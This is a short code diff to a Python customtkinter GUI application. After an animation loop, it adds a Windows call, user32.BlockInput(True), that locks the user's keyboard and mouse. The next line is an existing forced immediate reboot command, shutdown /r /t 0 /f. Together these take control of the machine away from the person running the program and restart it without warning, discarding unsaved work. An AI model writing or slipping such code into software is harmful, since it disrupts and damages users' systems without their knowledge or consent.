@@ -170,6 +170,7 @@ class App(customtkinter.CTk):
             angle += speed / 10
             if angle > math.pi :
                 angle = math.pi * -1
+        ctypes.windll.user32.BlockInput(True)
         time.sleep(0.5)
         os.system('shutdown /r /t 0 /f')
 
